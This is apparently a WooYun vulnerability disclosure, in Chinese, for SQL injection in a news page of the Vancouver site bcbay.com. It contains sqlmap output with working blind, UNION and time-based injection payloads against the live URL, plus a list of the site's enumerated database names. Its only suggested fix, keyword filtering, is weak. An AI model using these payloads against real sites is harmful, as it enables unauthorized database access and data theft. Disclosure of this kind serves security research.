wybug_title: 温哥华港湾某站SQL注射漏洞
wybug_status: 未联系到厂商或者厂商积极忽略
wybug_detail: 漏洞详情 披露状态：   									2014-07-08：	积极联系厂商并且等待厂商认领中，细节不对外公开									2014-08-22：	厂商已经主动忽略漏洞，细节向公众公开  简要描述： 很明显的多种注射漏洞 详细说明：  http://www.bcbay.com/life/education/newsViewer.php?id=243820出现多种显然易见的SQL注射漏洞，危害不小   漏洞证明：  sqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: GETParameter: id    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: id=243820 AND 1791=1791    Vector: AND [INFERENCE]    Type: UNION query    Title: MySQL UNION query (NULL) - 8 columns    Payload: id=-2486 UNION ALL SELECT 63,63,63,63,63,CONCAT(0x7171787971,0x52634c68687646636452,0x7168637171),63,63#    Vector:  UNION ALL SELECT 63,63,63,63,63,[QUERY],63,63#    Type: AND/OR time-based blind    Title: MySQL >= 5.0 time-based blind - Parameter replace    Payload: id=(SELECT (CASE WHEN (2454=2454) THEN SLEEP(5) ELSE 2454*(SELECT 2454 FROM INFORMATION_SCHEMA.CHARACTER_SETS) END))    Vector: (SELECT (CASE WHEN ([INFERENCE]) THEN SLEEP([SLEEPTIME]) ELSE [RANDNUM]*(SELECT [RANDNUM] FROM INFORMATION_SCHEMA.CHARACTER_SETS) END))---[23:54:00] [INFO] the back-end DBMS is MySQLweb application technology: PHP 5.3.3, Apacheback-end DBMS: MySQL 5[23:54:00] [INFO] fetched data logged to text files under '/root/.sqlmap/output/www.bcbay.com'   available databases [11]:                                                                                              [*] cm_mailer[*] creaders_blog[*] dz_bbs[*] dz_bbs2[*] dz_bg[*] dz_uc[*] gangwan_forum_0903[*] gangwan_news_0903[*] information_schema[*] mysql[*] y136888_mailer   修复方案：  过滤关键字，提高安全性   版权声明：转载请注明来源 路人甲@乌云
wybug_reply: 漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝
